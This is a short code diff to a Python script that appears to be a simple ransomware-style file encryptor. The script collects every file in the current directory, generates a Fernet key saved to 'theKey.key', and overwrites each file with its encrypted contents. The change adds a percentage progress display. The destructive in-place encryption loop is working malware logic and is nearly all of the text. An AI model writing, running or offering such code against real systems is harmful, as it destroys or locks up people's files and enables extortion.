@@ -9,6 +9,11 @@ for file in os.listdir():
         if os.path.isfile(file):
             files.append(file)
 
+#Stats of files to be encrypted...
+num_of_files = len(files)
+status_func = (1/num_of_files)*100
+status = 0.0
+
 #Generating the encryption Key...
 key = Fernet.generate_key()
 with open("theKey.key", "wb") as the_key:
@@ -21,6 +26,12 @@ for file in files:
         encrypted_content = Fernet(key).encrypt(content)
         with open(file, "wb") as theFile:
             theFile.write(encrypted_content)
+            status+=status_func
+            status = round(status, 1)
+            if status <= 100:
+                print(str(status)+ "% " + "done..")
+            else:
+                print("100% " + "done..")
 
 
 print("Files at the location " + os.getcwd() + " are encrypted..!")
